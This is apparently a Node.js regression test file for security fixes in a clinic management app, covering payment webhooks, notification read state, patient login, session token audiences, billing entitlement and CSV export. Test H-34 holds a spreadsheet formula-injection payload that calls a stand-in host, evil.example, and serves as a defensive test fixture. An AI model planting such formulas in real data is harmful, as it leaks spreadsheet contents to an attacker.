'use strict';

/**
 * Regression tests for the release-audit fixes.
 *
 * Each test pins a defect that was found in the audit and is cheap to reintroduce. They are
 * deliberately behavioural (what an attacker or a second staff member observes) rather than
 * assertions about implementation detail.
 */
process.env.NODE_ENV = 'development';
process.env.DEV_AUTH = 'true';
process.env.PAYMENTS_DRIVER = 'mock';
process.env.SMTP_HOST = ''; // force the dev email sink — tests must never hit real SMTP (even if .env sets it),
// and it is what makes otpService return devCode so the OTP flow is testable.

const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const http = require('http');
const { MongoMemoryServer } = require('mongodb-memory-server');
const mongoose = require('mongoose');

const { Notification, Clinic, Payment, Invoice } = require('../src/models');
const { createApp } = require('../src/app');
const patientService = require('../src/services/patientService');
const invoiceService = require('../src/services/invoiceService');
const notificationService = require('../src/services/notificationService');
const exportService = require('../src/services/exportService');
const portalService = require('../src/services/portalService');
const otpService = require('../src/services/otpService');
const patientSession = require('../src/lib/patientSession');
const { effectivePlan, planHasFeature } = require('../src/config/plans');
const gateway = require('../src/lib/payments');
const storage = require('../src/lib/storage');

const ctxA = { clinicId: 'org_A', actorId: 'ua', actorRole: 'owner' };
const hdr = { 'content-type': 'application/json', 'x-dev-clinic-id': 'org_A', 'x-dev-role': 'owner', 'x-dev-user-id': 'ua' };

let mongod;
let server;
let base;

before(async () => {
  mongod = await MongoMemoryServer.create();
  await mongoose.connect(mongod.getUri(), { dbName: 'audit_fixes' });
  await Promise.all([Payment.init(), Invoice.init()]); // build unique indexes before the tests run
  // A plan that actually unlocks BILLING — otherwise order creation 403s and the webhook tests
  // would pass vacuously (no Payment row to credit).
  await Clinic.create({ clinicId: 'org_A', name: 'A', slug: 'audit-fixes', subscriptionPlan: 'standard' });
  server = http.createServer(createApp());
  await new Promise((r) => server.listen(0, r));
  base = `http://127.0.0.1:${server.address().port}`;
});

after(async () => {
  await new Promise((r) => server.close(r));
  await mongoose.disconnect();
  await mongod.stop();
});

async function makeInvoice(total = 500) {
  const p = await patientService.createPatient(ctxA, { name: 'Audit Fix', phone: '9990001111' });
  return invoiceService.create(ctxA, { patientId: p._id, items: [{ description: 'Consult', amount: total, quantity: 1 }] });
}

// ---------------------------------------------------------------------------
// B-1 — the payment webhook must credit ONLY a settled payment.
// ---------------------------------------------------------------------------
test('B-1: a payment.failed webhook does NOT credit the invoice', async () => {
  const inv = await makeInvoice(500);
  const order = await (await fetch(`${base}/api/payments/invoice/${inv._id}/order`, { method: 'POST', headers: hdr })).json();
  // Guard the guard: if order creation ever fails, there is no Payment row and the assertions
  // below would pass for the wrong reason.
  assert.ok(order.orderId, `order must be created for the webhook to have something to credit (got ${JSON.stringify(order)})`);

  const body = JSON.stringify({
    id: 'evt_failed_1',
    event: 'payment.failed',
    payload: { payment: { entity: { order_id: order.orderId, id: 'pay_failed_1', amount: 50000, method: 'card', status: 'failed' } } },
  });
  const res = await fetch(`${base}/api/payments/webhook`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-razorpay-signature': gateway.devSignWebhook(body), 'x-razorpay-event-id': 'evt_failed_1' },
    body,
  });
  assert.equal(res.status, 200, 'the webhook is still acknowledged (so the provider stops retrying)');

  const after = await invoiceService.getById(ctxA, inv._id);
  assert.equal(after.amountPaid, 0, 'a declined card must leave the invoice unpaid');
  assert.notEqual(after.status, 'paid');
});

test('B-1: an authorized-but-not-captured payment does NOT credit the invoice', async () => {
  const inv = await makeInvoice(700);
  const order = await (await fetch(`${base}/api/payments/invoice/${inv._id}/order`, { method: 'POST', headers: hdr })).json();
  // Guard the guard: if order creation ever fails, there is no Payment row and the assertions
  // below would pass for the wrong reason.
  assert.ok(order.orderId, `order must be created for the webhook to have something to credit (got ${JSON.stringify(order)})`);

  const body = JSON.stringify({
    id: 'evt_authorized_1',
    event: 'payment.authorized',
    payload: { payment: { entity: { order_id: order.orderId, id: 'pay_auth_1', amount: 70000, method: 'card', status: 'authorized' } } },
  });
  await fetch(`${base}/api/payments/webhook`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-razorpay-signature': gateway.devSignWebhook(body), 'x-razorpay-event-id': 'evt_authorized_1' },
    body,
  });

  const after = await invoiceService.getById(ctxA, inv._id);
  assert.equal(after.amountPaid, 0, 'authorized is not settled money');
});

// ---------------------------------------------------------------------------
// B-7 — broadcast notifications carry PER-USER read state.
// ---------------------------------------------------------------------------
test('B-7: one staff member clearing the bell does not clear it for a colleague', async () => {
  const alice = { clinicId: 'org_A', actorId: 'alice', actorRole: 'receptionist' };
  const bob = { clinicId: 'org_A', actorId: 'bob', actorRole: 'doctor' };

  await Notification.deleteMany({ clinicId: 'org_A' });
  // A broadcast: recipientId null = every staff member sees it.
  await notificationService.emit(alice, { type: 'other', message: 'A refund FAILED at the gateway' });

  assert.equal(await notificationService.unreadCount(alice), 1, 'alice sees it');
  assert.equal(await notificationService.unreadCount(bob), 1, 'bob sees it');

  await notificationService.markAllRead(alice);

  assert.equal(await notificationService.unreadCount(alice), 0, 'alice has cleared her own bell');
  assert.equal(await notificationService.unreadCount(bob), 1, "bob's bell is untouched");

  const bobRows = await notificationService.list(bob, {});
  assert.equal(bobRows[0].read, false, 'the row still reads as unread for bob');
});

// ---------------------------------------------------------------------------
// B-2 — a shared contact must not silently bind the session to the wrong person.
// ---------------------------------------------------------------------------
test('B-2: a phone shared by two people forces a choice instead of guessing', async () => {
  const slug = 'audit-fixes';
  const shared = 'shared.household@example.com';

  // The household norm: one contact, two distinct people. findOrCreatePatient creates separate
  // records on purpose (different names), which is exactly what used to make login ambiguous.
  const mum = await patientService.createPatient(ctxA, { name: 'Asha Verma', email: shared, phone: '9998887777' });
  const son = await patientService.createPatient(ctxA, { name: 'Rohan Verma', email: shared, phone: '9998887777' });

  const otp = await otpService.requestOtp(ctxA.clinicId, shared);
  const res = await portalService.verifyLogin(slug, shared, otp.devCode);

  assert.equal(res.needsSelection, true, 'login must ask WHO rather than pick one');
  assert.equal(res.token, undefined, 'no session is issued before the person is known');
  const ids = res.candidates.map((c) => c.id).sort();
  assert.deepEqual(ids, [String(mum._id), String(son._id)].sort(), 'both people are offered');

  // Choosing one yields a session bound to exactly that patient.
  const chosen = await portalService.selectPatient(slug, res.selectionToken, String(son._id));
  const claims = patientSession.verifyFor(chosen.token, patientSession.AUDIENCE.PORTAL);
  assert.equal(claims.patientId, String(son._id), 'the session is bound to the person who chose');

  // A tampered choice — someone else's id — is refused.
  const outsider = await patientService.createPatient(ctxA, { name: 'Unrelated', email: 'other@example.com', phone: '9111111111' });
  await assert.rejects(
    () => portalService.selectPatient(slug, res.selectionToken, String(outsider._id)),
    /choose one of the listed people/i,
    'the selection token pins the candidate set'
  );
});

// ---------------------------------------------------------------------------
// H-47 — patient session tokens are audience-bound.
// ---------------------------------------------------------------------------
test('H-47: a storefront token is rejected by the portal, and vice versa', () => {
  const mk = (aud) => patientSession.sign({ clinicId: 'org_A', patientId: 'p1', email: 'x@y.z', aud, exp: Date.now() + 60_000 });

  const storeToken = mk(patientSession.AUDIENCE.STORE);
  const portalToken = mk(patientSession.AUDIENCE.PORTAL);

  assert.equal(patientSession.verifyFor(storeToken, patientSession.AUDIENCE.PORTAL), null, 'store token cannot read medical records');
  assert.ok(patientSession.verifyFor(storeToken, patientSession.AUDIENCE.STORE), 'store token works on the store');
  assert.equal(patientSession.verifyFor(portalToken, patientSession.AUDIENCE.STORE), null, 'portal token cannot drive the store session');
  assert.ok(patientSession.verifyFor(portalToken, patientSession.AUDIENCE.PORTAL), 'portal token works on the portal');

  // Pre-existing sessions carry no audience and must keep working until they expire.
  const legacy = patientSession.sign({ clinicId: 'org_A', patientId: 'p1', exp: Date.now() + 60_000 });
  assert.ok(patientSession.verifyFor(legacy, patientSession.AUDIENCE.PORTAL), 'legacy token still accepted');
});

// ---------------------------------------------------------------------------
// H-34 — CSV exports must neutralise spreadsheet formulas.
// ---------------------------------------------------------------------------
test('H-34: a patient name that looks like a formula is exported as inert text', async () => {
  // A name like this arrives from the UNAUTHENTICATED public booking form.
  const hostile = '=HYPERLINK("http://evil.example/"&A1,"click me")';
  await patientService.createPatient(ctxA, { name: hostile, phone: '9995550000' });

  const { csv } = await exportService.exportCsv(ctxA, 'patients', {});
  const line = csv.split('\n').find((l) => l.includes('evil.example'));
  assert.ok(line, 'the row is present in the export');
  assert.ok(!/(^|,)"?=HYPERLINK/.test(line), 'the cell must not begin with = (Excel would execute it)');
  assert.ok(line.includes("'=HYPERLINK") || line.includes('"\'=HYPERLINK'), 'the value is prefixed so it is read as text');
});

// ---------------------------------------------------------------------------
// B-3 — billing state must actually gate entitlement.
// ---------------------------------------------------------------------------
test('B-3: entitlement follows billing state, with a grace period', () => {
  const premium = { subscriptionPlan: 'premium' };

  assert.equal(effectivePlan({ ...premium, subscriptionStatus: 'active' }), 'premium', 'paying clinic keeps its plan');

  // Inside grace: a failed card must NOT interrupt care.
  const inGrace = { ...premium, subscriptionStatus: 'past_due', graceUntil: new Date(Date.now() + 3 * 86400_000) };
  assert.equal(effectivePlan(inGrace), 'premium', 'past_due inside grace keeps paid features');

  // Grace elapsed: entitlement drops to basic. This is the case that previously did nothing at all.
  const lapsed = { ...premium, subscriptionStatus: 'past_due', graceUntil: new Date(Date.now() - 86400_000) };
  assert.equal(effectivePlan(lapsed), 'basic', 'past_due beyond grace falls back to basic');
  assert.equal(planHasFeature(effectivePlan(lapsed), 'ANALYTICS'), false, 'premium features are paused');
  assert.equal(planHasFeature(effectivePlan(lapsed), 'ONLINE_BOOKING'), true, 'core booking still works');

  assert.equal(effectivePlan({ ...premium, subscriptionStatus: 'cancelled' }), 'basic', 'cancelled drops immediately');
});

test('B-3: a suspended clinic is locked out of the staff app', async () => {
  await Clinic.updateOne({ clinicId: 'org_A' }, { $set: { status: 'suspended', suspendedAt: new Date() } });
  try {
    const res = await fetch(`${base}/api/patients`, { headers: hdr });
    assert.equal(res.status, 403, 'suspended clinics cannot reach the staff API');
    const body = await res.json();
    assert.equal(body.error || body.details?.error, 'clinic_suspended');
  } finally {
    // Restore so later tests (and any shared state) are unaffected.
    await Clinic.updateOne({ clinicId: 'org_A' }, { $set: { status: 'active', suspendedAt: null } });
  }

  const ok = await fetch(`${base}/api/patients`, { headers: hdr });
  assert.equal(ok.status, 200, 'restoring the clinic restores access — suspension is reversible');
});

// ---------------------------------------------------------------------------
// B-12 — signed file links are absolute (they are consumed cross-origin).
// ---------------------------------------------------------------------------
test('B-12: getSignedUrl returns an absolute url and no relative footgun', () => {
  const link = storage.getSignedUrl({ clinicId: 'org_A', key: 'reports/x.pdf', ttlSeconds: 60 });
  assert.match(link.url, /^https?:\/\/.+\/api\/files\/blob\?t=/, 'absolute so it resolves against the API, not the SPA');
  assert.equal(link.path, undefined, 'the relative form is not offered');
});
